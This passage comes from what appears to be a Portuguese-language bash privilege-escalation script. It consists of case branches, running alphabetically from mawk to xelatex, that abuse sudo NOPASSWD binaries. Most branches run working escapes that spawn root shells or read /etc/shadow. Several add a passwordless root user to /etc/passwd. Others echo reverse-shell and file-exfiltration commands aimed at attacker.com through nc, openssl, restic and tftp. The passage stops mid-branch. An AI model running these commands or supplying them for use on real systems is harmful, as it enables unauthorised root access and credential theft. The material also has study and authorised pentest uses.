        mawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        minicom)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo minicom -D /dev/null"
            echo "[+] Press Ctrl-A o and select Filenames and paths;"
            echo "[+] Press e, type /bin/sh, then Enter;"
            echo "[+] Press Esc twice;"
            echo "[+] Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x."
            ;;
        more)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TERM= sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        mosquitto)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow
            ;;
        mount)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o bind /bin/sh /bin/mount
            sudo "$paths"
            ;;
        msfconsole)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            irb
            system("/bin/sh")
            ;;
        msgattrib)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgcat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgconv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgfilter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo x | sudo "$paths" -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
            ;;
        msgmerge)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow /dev/null
            ;;
        msguniq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        mtr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --raw -F /etc/shadow
            ;;
        multitime)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        mv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "LFILE=file_to_write"
            echo "TF=$(mktemp)"
            echo "echo "DATA" > $TF"
            echo "sudo mv $TF $LFILE"
            ;;
        mysql)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e '\! /bin/sh'
            ;;
        nano)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^R^X
            reset; sh 1>&0 2>&0
            ;;
        nasm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -@ /etc/shadow
            ;;
        nawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        nc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "sudo nc -e /bin/sh $RHOST $RPORT"
            ;;
        ncdu)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            b
            ;;
        ncftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        neofetch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec /bin/sh' >$TF
            sudo "$paths" --config $TF
            ;;
        nft)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        nice)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        nl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -bn -w1 -s '' /etc/shadow
            ;;
        nm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" @$LFILE
            ;;
        nmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            sudo "$paths" --script=$TF
            ;;
        node)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
            ;;
        nohup)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
            ;;
        npm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
            sudo "$paths" -C $TF --unsafe-perm i
            ;;
        nroff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '#!/bin/sh' > $TF/groff
            echo '/bin/sh' >> $TF/groff
            chmod +x $TF/groff
            sudo GROFF_BIN_PATH=$TF "$paths"
            ;;
        nsenter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ntpdate)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a x -k /etc/shadow -d localhost
            ;;
        octave)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo octave-cli --eval 'system("/bin/sh")'
            ;;
        od)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -An -c -w9999 /etc/shadow
            ;;
        openssl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
            echo "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
            ;;
        openvpn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --config /etc/shadow
            sudo "$paths" --dev null --script-security 2 --up '/bin/sh -c sh'
            ;;
        openvt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            TF=$(mktemp -u)
            sudo "$paths" -- sh -c "$cmd >$TF 2>&1"
            cat $TF
            ;;
        opkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'exec /bin/sh' > $TF/x.sh
            fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
            sudo "$paths" install x_1.0_all.deb
            ;;
        pandoc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' >$TF
            sudo "$paths" -L $TF /dev/null
            ;;
        paste)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        pdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'import os; os.system("/bin/sh")' > $TF
            sudo "$paths" $TF
            cont
            ;;
        pdflatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        pdftex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        perf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" stat /bin/sh
            ;;
        perl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh";'
            ;;
        perlbug)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s 'x x x' -r x -c x -e 'exec /bin/sh;'
            ;;
        pexec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        pg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        php)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            CMD="/bin/sh"
            sudo "$paths" -r "system('$CMD');"
            ;;
        pic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -U
            .PS
            sh X sh X
            ;;
        pico)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^R^X
            reset; sh 1>&0 2>&0
            ;;
        pidstat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            sudo "$paths" -e $cmd
            ;;
        pip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
            sudo "$paths" install $TF
            ;;
        pkexec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        pkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
            sudo "$paths" install -y --no-repo-update ./x-1.0.txz
            ;;
        posh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        pr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        pry)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            system("/bin/sh")
            ;;
        psftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        psql)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            \?
            !/bin/sh
            ;;
        ptx)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -w 5000 /etc/shadow
            ;;
        puppet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
            ;;
        pwsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        python | python3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c 'import os; os.system("/bin/sh")'
            ;;
        rake)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -p '`/bin/sh 1>&0`'
            ;;
        rc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '/bin/sh'
            ;;
        readelf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" -a @$LFILE
            ;;
        red)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo red file_to_write"
            echo "a"
            echo "DATA"
            echo "."
            echo "w"
            echo "q"
            ;;
        redcarpet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        restic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "LFILE=file_or_dir_to_get"
            echo "NAME=backup_name"
            echo "sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE""
            ;;
        rev)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths"
            ;;
        rlwrap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        rpm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -eval '%{lua:os.execute("/bin/sh")}'
            ;;
        rpmdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%(/bin/sh 1>&2)'
            ;;
        rpmquery)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%{lua:posix.exec("/bin/sh")}'
            ;;
        rpmverify)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%(/bin/sh 1>&2)'
            ;;
        rsync)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
            ;;
        ruby)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh"'
            ;;
        run-mailcap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --action=view /etc/hosts
            !/bin/sh
            ;;
        run-parts)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --new-session --regex '^sh$' /bin
            ;;
        runscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '! exec /bin/sh' >$TF
            sudo "$paths" $TF
            ;;
        rview)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
            ;;
        rvim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
            ;;
        sash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        scanmem)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            shell /bin/sh
            ;;
        scp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'sh 0<&2 1>&2' > $TF
            chmod +x "$TF"
            sudo "$paths" -S $TF x y:
            ;;
        screen)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        script)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q /dev/null
            ;;
        scrot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e /bin/sh
            ;;
        sed)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n '1e exec sh 1>&0' /etc/hosts
            ;;
        service)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" ../../bin/sh
            ;;
        setarch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" $(arch) /bin/sh
            ;;
        setfacl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            USER=$(id -un)
            sudo "$paths" -m -u:$USER:rwx $LFILE
            cat /etc/shadow
            ;;
        setlock)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" - /bin/sh
            ;;
        sftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            HOST=user@localhost.com
            sudo "$paths" $HOST
            !/bin/sh
            ;;
        sg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" root
            ;;
        shuf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /tmp/passwdBKP
            LFILE=/etc/passwd
            echo 'v::0:0:root:/root:/bin/bash' > /tmp/fke
            sudo "$paths" -e "$(cat /tmp/fke)" -o $LFILE
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        slsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'system("/bin/sh")'
            ;;
        smbclient)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '\\x\y'
            !/bin/sh
            ;;
        snap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            cd $(mktemp -d)
            mkdir -p meta/hooks
            printf '#!/bin/sh\n%s; false' "$cmd" >meta/hooks/install
            chmod +x meta/hooks/install
            fpm -n xxxx -s dir -t snap -a all meta
            sudo "$paths" install xxxx_1.0_all.snap --dangerous --devmode
            ;;
        socat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" stdin exec:/bin/sh
            ;;
        soelim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        softlimit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        sort)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -m /etc/shadow
            ;;
        split)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --filter=/bin/sh /dev/stdin
            ;;
        sqlite3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null '.shell /bin/sh'
            ;;
        sqlmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
            ;;
        ss)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a -F /etc/shadow
            ;;
        ssh-agent)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/
            ;;
        ssh-keygen)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -D ./lib.so
            ;;
        ssh-keyscan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        ssh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o ProxyCommand=';sh 0<&2 1>&2' x
            ;;
        sshpass)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        start-stop-daemon)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n $RANDOM -S -x /bin/sh
            ;;
        stdbuf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i0 /bin/sh
            ;;
        strace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o /dev/null /bin/sh
            ;;
        strings)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        su)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        sudo)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        sysctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='/bin/sh -c id>/tmp/id'
            sudo "$paths" "kernel.core_pattern=|$cmd"
            sleep 9999 &
            kill -QUIT $!
            cat /tmp/id
            ;;
        systemctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (exitem 3 tecnicas):"
            sudo "$paths"
            !sh
            ;;
        systemd-resolve)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --status
            !sh
            ;;
        tac)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s 'RANDOM' /etc/shadow
            ;;
        tail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c1G /etc/shadow
            ;;
        tar)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        task)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" execute /bin/sh
            ;;
        taskset)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 1 /bin/sh
            ;;
        tasksh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        tbl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        tclsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 
            exec /bin/sh <@stdin >@stdout 2>@stderr
            ;;
        tcpdump)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='id'
            TF=$(mktemp)
            echo "$cmd" > $TF
            chmod +x $TF
            sudo "$paths" -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
            ;;
        tdbtool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 
            ! /bin/sh
            ;;
        tee)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /etc/passwdBKP
            echo 'v::0:0:root:/root:/bin/bash' | sudo "$paths" -a /etc/passwd
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "[+] Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        telnet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=test.com"
            echo "RPORT=12345"
            echo "sudo "$paths" $RHOST $RPORT"
            echo "^]"
            echo "!/bin/sh"
            ;;
        terraform)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo "$paths" console"
            echo "file("file_to_read")"
            ;;
        tex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        tftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "sudo tftp $RHOST"
            echo "put file_to_send"
            ;;
        tic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -C /etc/shadow
            ;;
        time)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        timedatectl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" list-timezones
            !/bin/sh
            ;;
        timeout)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --foreground 7d /bin/sh
            ;;
        tmate)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /bin/sh
            ;;
        tmux)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        top)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
            echo "[+] Pressione ENTER duas vezes e depois 'x' para shell root"
            sudo "$paths"
            reset
            ;;
        torify)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        torsocks)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        troff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        ul)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        unexpand)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -t99999999 /etc/shadow
            ;;
        uniq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        unshare)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        unsquashfs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo unsquashfs shell"
            echo "./squashfs-root/sh -p"
            ;;
        unzip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo unzip -K shell.zip"
            echo "./sh -p"
            ;;
        update-alternatives)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /etc/passwdBKP
            LFILE=/etc/passwd
            TF=$(mktemp)
            echo 'v::0:0:root:/root:/bin/bash' > $TF
            sudo "$paths" --force --install "$LFILE" x "$TF" 0
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "[+] Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        uudecode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/stdout | "$paths"
            ;;
        uuencode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/stdout | "$paths"
            ;;
        vagrant)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cd $(mktemp -d)
            echo 'exec "/bin/sh"' > Vagrantfile
            sudo "$paths" up
            ;;
        valgrind)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        varnishncsa)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '%{run{/bin/bash}}x' > $TF
            sudo "$paths" -F "$(cat $TF)"
            id
            ;;
        vi)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c ':!/bin/sh' /dev/null
            ;;
        view)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -c ':!/bin/sh'
            ;;
        vigr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        vim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -c ':!/bin/sh'
            ;;
        vimdiff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -c ':!/bin/sh'
            ;;
        vipw)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        virsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/sbuaisdh.sh
            chmod +x /tmp/sbuaisdh.sh
            SCRIPT=/tmp/sbuaisdh.sh
            TF=$(mktemp)
            cat > $TF << EOF
            <domain type='kvm'>
              <name>x</name>
              <os>
                <type arch='x86_64'>hvm</type>
              </os>
              <memory unit='KiB'>1</memory>
              <devices>
                <interface type='ethernet'>
                  <script path='$SCRIPT'/>
                </interface>
              </devices>
            </domain>
EOF
            sudo "$paths" -c qemu:///system create $TF
            "$paths" -c qemu:///system destroy x
            /bin/bash -p
            id
            ;;
        w3m)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"  /etc/shadow -dump
            ;;
        wall)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --nobanner /etc/shadow
            ;;
        watch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -x sh -c 'reset; exec sh 1>&0 2>&0'
            ;;
        wc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --files0-from /etc/shadow
            ;;
        wget)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            chmod +x $TF
            echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
            sudo "$paths" --use-askpass=$TF 0
            ;;
        whiptail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --textbox --scrolltext /etc/shadow 0 0
            ;;
        wish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            exec /bin/sh <@stdin >@stdout 2>@stderr
            ;;
        xargs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a /dev/null sh
            ;;
        xdg-user-dir)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '}; /bin/sh #'
            ;;
        xdotool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec --sync /bin/sh
            ;;
        xelatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
